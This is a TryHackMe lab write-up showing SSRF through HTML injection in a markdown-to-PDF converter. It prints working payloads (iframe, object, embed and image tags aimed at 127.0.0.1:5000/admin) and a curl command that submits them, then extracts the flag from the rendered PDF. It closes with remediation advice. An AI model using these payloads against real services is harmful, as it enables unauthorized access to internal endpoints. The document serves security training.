# 📄 MD2PDF — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Category](https://img.shields.io/badge/Category-Web%20|%20SSRF%20|%20HTML%20Injection-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [MD2PDF](https://tryhackme.com/room/md2pdf)

---

## 📋 Executive Summary

This writeup documents the exploitation of the **MD2PDF** machine, demonstrating a **Server-Side Request Forgery (SSRF)** vulnerability in a markdown-to-PDF converter application. The attack chain leverages HTML injection within markdown input to access restricted administrative content through server-side PDF rendering, bypassing IP-based access controls.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service enumeration |
| `gobuster` | Directory enumeration |
| `curl` | HTTP request testing |
| `pdftotext` | PDF content extraction |
| `strings` | Binary string extraction |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>

Findings
Table
Port	State	Service	Notes
22/tcp	open	SSH	Standard access
80/tcp	open	HTTP	MD2PDF web application
Key Observations:

    Single externally accessible web service on port 80
    No additional open ports detected externally

Directory Enumeration
bash
Copy

gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

Discovery: /admin endpoint returns 403 Forbidden
Error Message: "Only accessible from 127.0.0.1"
Analysis: Administrative panel restricted to localhost — suggests internal service or IP-based access control.
🌐 Phase 2: Web Application Analysis
Application Functionality
The MD2PDF converter accepts markdown input and generates PDF output.
Normal Usage Flow:

    User submits markdown content via web form
    Server processes input through markdown parser
    PDF generation engine renders HTML content
    Generated PDF returned as download

Request Structure:
http
Copy

POST /convert HTTP/1.1
Host: <TARGET_IP>
Content-Type: application/x-www-form-urlencoded

md=%23+Hello+World

HTML Injection Verification
Tested raw HTML rendering within markdown input:
markdown
Copy

<h1>Test</h1>
<p style="color:red">HTML injection works!</p>

Result: HTML tags preserved in generated PDF — parser does not sanitize raw HTML.
🎯 Phase 3: SSRF Exploitation
Vulnerability Theory
PDF generation engines (wkhtmltopdf, WeasyPrint, Puppeteer, Playwright) fetch external resources (images, stylesheets, iframes) by making HTTP requests from the server itself. When the server processes markdown containing external resource references, the request originates from 127.0.0.1, bypassing IP-based restrictions.
Attack Vector: Inject HTML element that forces server-side HTTP request to restricted endpoint.
Payload Crafting
Primary Vector — iframe Injection:
HTML
Preview
Copy

<iframe src="http://127.0.0.1:5000/admin" width="1000" height="1000"></iframe>

Alternative Vectors:
Table
Vector	Payload	Use Case
Image	![admin](http://127.0.0.1:5000/admin)	Basic SSRF probe
Object	<object data="http://127.0.0.1:5000/admin"></object>	Alternative embedding
Embed	<embed src="http://127.0.0.1:5000/admin" width="1000" height="1000">	Fallback vector
Exploitation Execution
Step 1: Submit SSRF payload:
bash
Copy

curl -X POST http://<TARGET_IP>/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "md=<iframe src=\"http://127.0.0.1:5000/admin\" width=\"1000\" height=\"1000\"></iframe>" \
  -o output.pdf

Step 2: Extract content from PDF:
bash
Copy

# Text extraction
pdftotext output.pdf extracted.txt

# String search for flag pattern
strings output.pdf | grep -i "flag\|thm\|{"

🏁 Phase 4: Flag Extraction
PDF Content Analysis
The generated PDF contains the rendered administrative panel from the internal service, including the flag.
Extraction Methods:
bash
Copy

# Method 1: pdftotext
pdftotext output.pdf -
cat extracted.txt

# Method 2: strings + grep
strings output.pdf | grep -i "flag"

# Method 3: Manual inspection
# Open PDF in viewer and inspect rendered content

🗺️ Attack Path Visualization
plain
Copy

[Attacker]
    │
    ├───nmap───► [Target: 22, 80]
    │                │
    │                ▼
    │        [Port 80: MD2PDF Web App]
    │                │
    │                ▼
    │        [gobuster: /admin discovered]
    │                │
    │                ▼
    │        [403 Forbidden — localhost only]
    │                │
    │                ▼
    │        [HTML injection verified in PDF]
    │                │
    │                ▼
    │        [iframe SSRF payload submitted]
    │                │
    │                ▼
    │        [Server requests 127.0.0.1:5000/admin]
    │                │
    │                ▼
    │        [Admin content rendered in PDF]
    │                │
    │                ▼
    └────────► [Flag extracted from PDF output]

🛡️ Vulnerability Assessment & Remediation
Table
#	Vulnerability	Severity	CVSS	Remediation
1	Server-Side Request Forgery (SSRF)	🔴 Critical	9.1	Implement URL allowlists; block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16); validate DNS resolution
2	HTML Injection in Markdown	🟠 High	7.5	Sanitize markdown input; disable raw HTML rendering; use libraries like bleach or markdown2 with safe mode
3	IP-Based Access Control Bypass	🟠 High	7.0	Implement authentication tokens; use network segmentation; apply defense in depth
4	Unrestricted PDF Generation	🟡 Medium	5.3	Sandbox PDF generation process; restrict external resource fetching; implement request timeouts
🎓 Key Takeaways

    SSRF via PDF Rendering: Server-side PDF engines fetch external resources — this is exploitable when user input controls resource URLs
    localhost ≠ Security: Services restricted to localhost are vulnerable if the server can be coerced into making requests
    HTML in Markdown: Many markdown parsers accept raw HTML by default — always test for injection vectors
    iframe as SSRF Vector: <iframe> forces PDF renderer to fetch and render external content server-side
    403 Bypass Techniques: IP-based restrictions fail when requests originate from the server itself

📁 Repository Structure
plain
Copy

.
├── README.md
├── nmap/
│   └── md2pdf_scan.nmap
├── exploits/
│   ├── iframe_ssrf.md
│   └── curl_exploit.sh
├── output/
│   └── admin_content.pdf
└── screenshots/
    ├── web_interface.png
    ├── admin_403.png
    ├── pdf_flag.png
    └── network_tab.png

🚩 Flags
Table
Flag	Location	Value
Flag	Extracted from PDF rendering of http://127.0.0.1:5000/admin	THM{...}

    Note: Flag values are dynamic per TryHackMe instance. The vulnerability chain remains consistent.

    ⚠️ Legal Disclaimer: This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

Author: Miraç Akkuş (LatenT)
Date: May 2026
